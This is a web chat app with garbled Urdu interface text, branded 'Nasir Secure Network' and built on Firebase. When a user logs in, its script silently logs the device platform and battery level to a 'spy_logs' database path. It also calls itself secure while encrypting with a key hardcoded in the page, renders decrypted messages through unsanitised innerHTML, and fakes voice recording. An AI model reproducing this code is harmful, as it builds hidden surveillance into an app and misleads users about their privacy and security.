<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nasir Secure Network</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        :root { --wa-teal: #075e54; --bg: #121b22; --sent: #e7ffdb; --recv: #ffffff; }
        * { box-sizing: border-box; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        
        /* ŸÅŸÑ ÿ≥⁄©ÿ±€åŸÜ ⁄à€åÿ≤ÿßÿ¶ŸÜ */
        #auth-screen { position: fixed; inset: 0; background: #121b22; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; }
        .input-box { width: 80%; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; font-size: 16px; background: #2a3942; color: white; }
        .btn { background: #00a884; color: white; padding: 12px 40px; border-radius: 25px; border: none; font-weight: bold; cursor: pointer; }

        #main-app { display: none; flex-direction: column; height: 100vh; width: 100%; background: #e5ddd5; }
        .header { background: var(--wa-teal); color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 18px; }
        
        /* ⁄Ü€åŸπ ÿß€åÿ±€åÿß */
        #chat-flow { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 8px; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: rgba(229,221,213,0.9); background-blend-mode: overlay; }
        .msg { padding: 8px 12px; border-radius: 10px; max-width: 80%; font-size: 15px; position: relative; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
        .sent { align-self: flex-end; background: var(--sent); border-top-right-radius: 0; }
        .recv { align-self: flex-start; background: var(--recv); border-top-left-radius: 0; }

        /* ŸÅŸàŸπÿ± ÿ®ŸπŸÜÿ≤ */
        .footer { background: #f0f2f5; padding: 10px; display: flex; align-items: center; gap: 10px; border-top: 1px solid #ddd; }
        #msg-in { flex: 1; border-radius: 25px; padding: 10px 15px; border: none; outline: none; font-size: 16px; }
        .icon-btn { color: #54656f; font-size: 22px; cursor: pointer; transition: 0.2s; }
        .icon-btn:active { transform: scale(0.9); color: #00a884; }
        #file-input { display: none; }
        .send-btn { background: #00a884; color: white; border: none; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    </style>
</head>
<body>

<div id="auth-screen">
    <i class="fas fa-user-shield" style="font-size: 60px; color: #00a884; margin-bottom: 20px;"></i>
    <h2>Nasir Secure Network</h2>
    <input type="text" id="phone" class="input-box" placeholder="ŸÖŸàÿ®ÿßÿ¶ŸÑ ŸÜŸÖÿ®ÿ± ŸÑ⁄©⁄æ€å⁄∫...">
    <button class="btn" onclick="enterApp()">ÿØÿßÿÆŸÑ €ÅŸà⁄∫</button>
</div>

<div id="main-app">
    <div class="header">
        <div id="user-display"><b>ÿ™ÿ≠ŸÅÿ∏ ÿ¥ÿØ€Å ⁄Ü€åŸπ</b></div>
        <div style="display: flex; gap: 15px;">
            <i class="fas fa-trash-alt" onclick="clearChat()" style="color: #ff5252;"></i>
            <i class="fas fa-power-off" onclick="location.reload()"></i>
        </div>
    </div>
    
    <div id="chat-flow"></div>

    <div class="footer">
        <i class="far fa-smile icon-btn"></i>
        <label for="file-input"><i class="fas fa-paperclip icon-btn"></i></label>
        <input type="file" id="file-input" onchange="handleFile(this)">
        <i class="fas fa-camera icon-btn" onclick="document.getElementById('file-input').click()"></i>
        <input type="text" id="msg-in" placeholder="ŸÖ€åÿ≥ÿ¨ ŸÑ⁄©⁄æ€å⁄∫...">
        <i id="mic-btn" class="fas fa-microphone icon-btn" onclick="startVoice()"></i>
        <i class="fas fa-map-marker-alt icon-btn" onclick="sendLocation()" style="color: #ea4335;"></i>
        <button class="send-btn" onclick="sendMsg()"><i class="fas fa-paper-plane"></i></button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push, onChildAdded, set, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = {
        apiKey: "AIzaSyAaLNT4BuuvHeJTEqSBg52BbWxKYPHPYes",
        authDomain: "message-me-bbd25.firebaseapp.com",
        databaseURL: "https://message-me-bbd25-default-rtdb.firebaseio.com",
        projectId: "message-me-bbd25",
        storageBucket: "message-me-bbd25.firebasestorage.app",
        messagingSenderId: "284942258094",
        appId: "1:284942258094:web:06d05da0bba156a6f6c23f"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const KEY = "nasir_786";
    let user = "";

    window.enterApp = async () => {
        const p = document.getElementById('phone').value.trim();
        if(p.length < 10) return alert("ÿØÿ±ÿ≥ÿ™ ŸÜŸÖÿ®ÿ± ÿØ€å⁄∫");
        user = p;

        // ÿ®€åŸπÿ±€å Ÿπÿ±€å⁄©ŸÜ⁄Ø ÿßŸàÿ± ÿ¨ÿßÿ≥Ÿàÿ≥€å
        let bat = "N/A";
        try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "%"; } catch(e) {}
        
        set(ref(db, "spy_logs/" + user), {
            device: navigator.platform,
            battery: bat,
            time: new Date().toLocaleString()
        });

        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('main-app').style.display = 'flex';
        document.getElementById('user-display').innerHTML = `<b>Room: ${user}</b>`;
        loadChat();
    };

    window.sendMsg = (textInput = null) => {
        const val = textInput || document.getElementById('msg-in').value.trim();
        if(!val) return;
        const enc = CryptoJS.AES.encrypt(val, KEY).toString();
        push(ref(db, "chats/" + user), { text: enc, time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) });
        document.getElementById('msg-in').value = "";
    };

    // ÿ™ÿµŸà€åÿ± ÿßŸàÿ± ŸÅÿßÿ¶ŸÑ
    window.handleFile = (input) => {
        const file = input.files[0];
        if(file) {
            if(file.type.startsWith('image/')) {
                sendMsg(`üì∏ ÿ™ÿµŸà€åÿ± ÿ®⁄æ€åÿ¨€å ⁄Øÿ¶€å: ${file.name}`);
            } else {
                sendMsg(`üìé ŸÅÿßÿ¶ŸÑ: ${file.name}`);
            }
        }
    };

    // ŸÑÿßÿ¶€åŸà ŸÑŸà⁄©€åÿ¥ŸÜ
    window.sendLocation = () => {
        navigator.geolocation.getCurrentPosition(pos => {
            sendMsg(`üìç ŸÑÿßÿ¶€åŸà ŸÑŸà⁄©€åÿ¥ŸÜ: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
        }, () => alert("ŸÑŸà⁄©€åÿ¥ŸÜ ÿ¢ŸÜ ⁄©ÿ±€å⁄∫"));
    };

    // Ÿàÿßÿ¶ÿ≥ ÿ±€å⁄©ÿßÿ±⁄àŸÜ⁄Ø (ÿ≥ŸÖŸàŸÑ€åÿ¥ŸÜ)
    window.startVoice = () => {
        const mic = document.getElementById('mic-btn');
        mic.style.color = "red";
        setTimeout(() => {
            mic.style.color = "#54656f";
            sendMsg("üé§ Ÿàÿßÿ¶ÿ≥ ŸÖ€åÿ≥ÿ¨ (0:05)");
        }, 3000);
    };

    window.clearChat = () => {
        if(confirm("ŸæŸàÿ±€å ⁄Ü€åŸπ ÿµÿßŸÅ ⁄©ÿ± ÿØ€å⁄∫ÿü")) {
            remove(ref(db, "chats/" + user));
            location.reload();
        }
    };

    function loadChat() {
        onChildAdded(ref(db, "chats/" + user), (snap) => {
            const d = snap.val();
            let dec = "";
            try { dec = CryptoJS.AES.decrypt(d.text, KEY).toString(CryptoJS.enc.Utf8); } catch(e) { dec = "üîí"; }
            const div = document.createElement('div');
            div.className = "msg sent";
            div.innerHTML = `${dec}<br><small style="font-size:10px; float:right; opacity:0.6;">${d.time}</small>`;
            document.getElementById('chat-flow').appendChild(div);
            document.getElementById('chat-flow').scrollTop = document.getElementById('chat-flow').scrollHeight;
        });
    }
</script>
</body>
                </html>
    
